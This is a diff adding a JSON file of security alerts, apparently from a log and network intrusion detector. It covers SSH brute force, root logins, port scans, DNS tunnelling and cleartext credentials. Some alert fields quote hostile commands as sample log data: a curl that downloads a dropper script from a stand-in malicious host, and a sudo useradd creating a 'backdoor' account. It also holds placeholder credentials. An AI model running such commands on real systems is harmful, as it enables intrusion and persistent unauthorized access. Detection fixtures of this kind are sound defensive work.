@@ -1,0 +1,88 @@
+{
+  "alerts": [
+    {
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "192.168.1.100",
+      "raw": "Failed password for admin from 192.168.1.100 port 22 ssh2",
+      "ts": "2026-05-07T09:00:13"
+    },
+    {
+      "threat": "ROOT_LOGIN",
+      "severity": "CRITICAL",
+      "ip": "203.0.113.42",
+      "raw": "ROOT LOGIN accepted FROM 203.0.113.42",
+      "ts": "2026-05-07T09:03:00"
+    },
+    {
+      "threat": "PRIV_ESCALATION",
+      "severity": "HIGH",
+      "ip": "N/A",
+      "raw": "sudo: operator : COMMAND=/usr/sbin/useradd backdoor",
+      "ts": "2026-05-07T09:04:00"
+    },
+    {
+      "threat": "MALWARE_DROPPER",
+      "severity": "CRITICAL",
+      "ip": "N/A",
+      "raw": "curl http://malicious-host.ru/dropper.sh -o /tmp/dropper.sh",
+      "ts": "2026-05-07T09:06:00"
+    },
+    {
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "185.220.101.1",
+      "raw": "Invalid user oracle from 185.220.101.1 port 1234 ssh2",
+      "ts": "2026-05-07T09:02:00"
+    },
+    {
+      "threat": "ACCEPTED_PUBKEY",
+      "severity": "HIGH",
+      "ip": "N/A",
+      "raw": "Accepted publickey for root from 192.168.1.77 port 22 ssh2",
+      "ts": "2026-05-07T09:05:00"
+    },
+    {
+      "type": "PORT_SCAN",
+      "severity": "HIGH",
+      "src": "192.168.100.200",
+      "detail": "SYN to 20+ unique ports detected",
+      "ts": "2026-05-07T09:11:00"
+    },
+    {
+      "type": "CRED_LEAK_HTTP",
+      "severity": "CRITICAL",
+      "src": "10.0.0.15",
+      "detail": "Authorization: Basic dXNlcjpwYXNzd29yZA==",
+      "ts": "2026-05-07T09:13:00"
+    },
+    {
+      "type": "DNS_TUNNEL_QUERY",
+      "severity": "HIGH",
+      "src": "10.0.0.42",
+      "detail": "Entropy=4.12, label=aGVsbG8td29ybGQtdGhpcy1pcy1hLXRlc3Q",
+      "ts": "2026-05-07T09:14:00"
+    },
+    {
+      "type": "CLEARTEXT_FTP",
+      "severity": "HIGH",
+      "src": "10.0.0.8",
+      "detail": "USER ftpuser PASS s3cr3tpass",
+      "ts": "2026-05-07T09:15:00"
+    },
+    {
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "10.0.0.99",
+      "raw": "Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-07T09:01:12"
+    },
+    {
+      "threat": "PORT_SCAN",
+      "severity": "HIGH",
+      "ip": "N/A",
+      "raw": "nmap scan detected from 192.168.100.200",
+      "ts": "2026-05-07T09:11:00"
+    }
+  ]
+}
